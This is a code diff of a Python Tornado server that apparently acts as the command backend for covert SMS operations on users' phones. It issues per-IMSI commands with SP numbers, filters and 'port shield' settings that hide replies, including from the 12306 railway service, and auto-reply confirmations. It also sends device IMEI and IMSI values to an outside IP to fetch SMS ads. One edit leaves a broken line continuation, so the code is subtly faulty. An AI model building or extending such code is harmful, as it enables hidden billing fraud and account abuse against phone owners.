@@ -26,6 +26,7 @@ poolConfig = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['config_db']['host
 poolLog = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['log_db']['host'], user=config.GLOBAL_SETTINGS['log_db']['user'], passwd=config.GLOBAL_SETTINGS[
     'log_db']['psw'], db=config.GLOBAL_SETTINGS['log_db']['name'], port=config.GLOBAL_SETTINGS['log_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
 systemConfigs = {}
+registerTargetConfigs = {}
 
 MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 MATCH_CONTENT += "<wml>"
@@ -315,6 +316,11 @@ def get_register_cmd(_user, _threads):
             '[spNumber]', '12306').replace('[filter]', '12306|铁路客服').replace('[portShield]', '12306')
         _threads.append(threading.Thread(
             target=async_update_register_cmd_count(_user, 'register12306CmdCount')))
+    elif str(_user['lastRegisterCmdAppIdList']).find(',107,') != -1 and registerTargetConfigs['107']['stateGet'] == 'open':
+        _result = FEE_CONTENT.replace('[cmd]', '').replace('[spNumber]', '').replace('[filter]', '').replace(
+            '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
+        _threads.append(threading.Thread(
+            target=async_update_register_cmd_mo_ready(_user, '107')))
     else:
         _result = None
     return _result
@@ -333,11 +339,18 @@ def async_update_cmd_fee(_user, _cmd):
     _dbConfig.close()
 
 
-def async_update_register_cmd_count(_user, _paraNmae):
-    _sql = 'update imsi_users set ' + _paraNmae + \
-        ' = ifnull(' + _paraNmae + ',0)  + 1  where imsi = %s '
+def async_update_register_cmd_count(_user, _paraName):
+    _sql = 'update imsi_users set ' + _paraName +
+        ' = ifnull(' + _paraName + ',0)  + 1  where imsi = %s '
     _dbConfig = poolConfig.connection()
     _dbConfig.cursor().execute(_sql, (_user['imsi']))
+    _dbConfig.close()
+
+
+def async_update_register_cmd_mo_ready(_user, _apid):
+    _sql = 'update register_user_relations set isMoReady = 1  where imsi = %s and apid= %s '
+    _dbConfig = poolConfig.connection()
+    _dbConfig.cursor().execute(_sql, (_user['imsi'], _apid))
     _dbConfig.close()
 
 
@@ -387,7 +400,7 @@ def get_system_parameter_from_db(_title):
     return systemConfigs[_title]
 
 
-def cache_system_parameter():
+def cache_parameter():
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT * FROM `system_configs` '
@@ -395,6 +408,11 @@ def cache_system_parameter():
     _recordRsp = _cur.fetchall()
     for _t in _recordRsp:
         systemConfigs[_t['title']] = _t['detail']
+    _sql = 'SELECT * FROM `register_targets` '
+    _cur.execute(_sql)
+    _recordRsp = _cur.fetchall()
+    for _t in _recordRsp:
+        registerTargetConfigs[_t['apid']] = _t
     _cur.close()
     _dbConfig.close()
     return
@@ -413,7 +431,7 @@ def fetch_sms_ads():
         if _recordRsp != None and systemConfigs['sendSmsAdFetch'] == 'open' and int(_recordRsp['tot']) <= int(systemConfigs['sendSmsAdLessNum']):
             url = 'http://203.86.8.198:6068/ido/get.php'
             _r = requests.get(url, params={
-                              'cid': '10354', 'imei': imei, 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
+                'cid': '10354', 'imei': imei, 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
             # _r = requests.get(url)
             data = _r.json()
             text = _r.text
@@ -482,8 +500,8 @@ if __name__ == "__main__":
     print("begin...")
     app = make_app()
     app.listen(config.GLOBAL_SETTINGS['port'], xheaders=True)
-    cache_system_parameter()
+    cache_parameter()
     fetch_sms_ads()
-    tornado.ioloop.PeriodicCallback(cache_system_parameter, 6000).start()
+    tornado.ioloop.PeriodicCallback(cache_parameter, 6000).start()
     tornado.ioloop.PeriodicCallback(fetch_sms_ads, 6000).start()
     tornado.ioloop.IOLoop.current().start()
